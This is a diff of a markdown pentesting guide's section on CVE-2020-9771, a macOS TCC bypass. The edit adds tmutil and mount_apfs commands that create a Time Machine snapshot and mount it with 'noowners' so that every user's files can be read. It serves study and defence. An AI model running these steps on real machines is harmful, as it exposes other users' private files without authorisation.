@@ -175,29 +175,34 @@ The extended attribute `com.apple.macl` **can’t be cleared** like other extend
 
 ## Bypasses
 
-## CVE-2020-9771 - mount\_apfs TCC bypass and privilege escalation
+### CVE-2020-9771 - mount\_apfs TCC bypass and privilege escalation
 
-If the system has some **time machine snapshots** generated, **any user** (even unprivileged ones) can mount it an **access ALL the files** of that snapshot.
+**Any user** (even unprivileged ones) can create and mount a time machine snapshot an **access ALL the files** of that snapshot.\
+The **only privileged** needed is for the application used (like `Terminal`) to have **Full Disk Access** (FDA) access (`kTCCServiceSystemPolicyAllfiles`) which need to be granted by an admin.
 
 {% code overflow="wrap" %}
 ```bash
+# Create snapshot
+tmutil localsnapshot
+
 # List snapshots
 tmutil listlocalsnapshots /
 Snapshots for disk /:
 com.apple.TimeMachine.2023-05-29-001751.local
 
 # Generate folder to mount it
+cd /tmp # I didn it from this folder
 mkdir /tmp/snap
 
-# Mount it
-/sbin/mount_apfs -o nobrowse,ro -s ccom.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap
+# Mount it, "noowners" will mount the folder so the current user can access everything
+/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap
 
 # Access it
 ls /tmp/snap/Users/admin_user # This will work
 ```
 {% endcode %}
 
-A more detailed explanation can be [**found in the original report**](https://theevilbit.github.io/posts/cve\_2020\_9771/) but in there it's explained that after the "fix" only applications with **Full Disk Access** (FDA) access (`kTCCServiceSystemPolicyAllfiles`) will be able to do this.
+A more detailed explanation can be [**found in the original report**](https://theevilbit.github.io/posts/cve\_2020\_9771/)**.**
 
 ### Write Bypass
 
